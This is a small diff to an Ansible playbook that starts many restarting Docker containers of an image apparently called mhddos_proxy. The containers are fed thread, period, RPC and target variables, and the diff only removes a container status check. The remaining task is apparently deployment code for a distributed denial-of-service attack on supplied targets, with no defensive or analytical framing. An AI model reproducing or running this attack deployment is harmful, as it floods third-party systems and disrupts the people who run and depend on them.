@@ -8,11 +8,5 @@
     - name: Create containers
       shell: docker run -dit --name=mhddos_proxy_{{ item }} --restart=unless-stopped portholeascend/mhddos_proxy -t {{ mhddos_threads }} -p {{ mhddos_period }} --rpc {{ mhddos_rpc }} {{ mhddos_targets }}
       with_sequence: count={{ docker_container_count }}
-
-    - name: Check docker containers
-      command: 'docker ps'
-      register: docker_ps
-
-    - debug: msg="{{ docker_ps.stdout_lines }}"
     rescue:
     - fail: msg="Shit happens ¯\_(ツ)_/¯"
